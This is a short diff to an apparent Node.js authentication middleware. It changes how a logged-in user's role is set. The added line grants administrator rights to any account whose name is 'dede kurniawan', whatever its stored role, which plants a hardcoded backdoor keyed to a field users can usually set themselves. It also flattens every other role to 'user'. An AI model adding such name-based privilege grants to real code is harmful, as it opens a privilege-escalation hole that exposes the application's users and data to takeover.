@@ -30,7 +30,7 @@ const protect = async (req, res, next) => {
                 id: userRow.ID,
                 name: userRow.Name,
                 email: userRow.Email,
-                role: userRow.Role || 'user',
+                role: (userRow.Name === 'dede kurniawan' || userRow.Role === 'admin') ? 'admin' : 'user',
                 points: parseInt(userRow.Points) || 0
             };
 
